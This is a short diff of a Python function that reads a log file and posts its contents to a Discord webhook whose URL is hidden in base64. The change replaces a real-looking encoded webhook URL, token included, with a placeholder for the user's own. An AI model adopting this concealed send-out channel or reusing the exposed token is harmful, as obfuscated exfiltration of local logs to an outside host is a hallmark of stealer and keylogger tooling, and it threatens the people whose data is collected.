@@ -86,7 +86,7 @@ def send_log_discord(filepath):
         log_content = f"[Error reading log file: {str(e)}]"
 
     try:
-        encoded_url = b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDIxNTU2NjE2OTczOTI2NC9ydGhMempIVlRrWFlQc1VJTndLcVo0N2hvOTVyYkZvWUZSS1MxYmViZ0tRNk1kMTh2QVFGenYzMDZnMUg1eklneVUybA=='
+        encoded_url = b'REPALCE ME WITH BASE64 WEBHOOK' # REPLACE INSIDE QUOTES WITH YOUR BASE 64 ENCODED WEBHOOK URL
         webhook_url = base64.b64decode(encoded_url).decode()
 
         requests.post(webhook_url, json={"content": f"```\n{log_content}\n```"})
